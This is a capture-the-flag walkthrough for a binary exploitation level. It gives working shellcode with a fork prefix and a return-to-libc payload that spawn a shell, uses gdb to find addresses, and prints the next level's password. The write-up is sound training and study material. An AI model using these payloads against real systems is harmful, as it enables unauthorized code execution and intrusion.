so here we cannot do an exec directly, we need to do a fork first in order to avoid the ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0);
so we have to preprend the following asm to our usual shellcode:

push 2			; syscall id of fork
pop eax			; the push-pop is a trick to avoid nul bytes in the resulting shellcode
int 0x80;		; syscall

which gives:
"\x6a\x02\x58\xcd\x80" + shellcode

(python -c 'print "\x90" * 106 + "\x6a\x02\x58\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x80\xd6\xff\xff"'; cat) | ~/level04

/************/
/* Method 2 */
/************/
A return to libc is also a valid method.

1. We search for the right addresses using gdb.
(gdb) print system
$7 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find 0xf7e6aed0, +99999999, "/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.

2. We craft our input, ignoring the demand for a shellcode.
level04@OverRide:~$ (python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "DUDE" + "\xec\x97\xf8\xf7"'; cat) | ~/level04             
Give me some shellcode, k
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
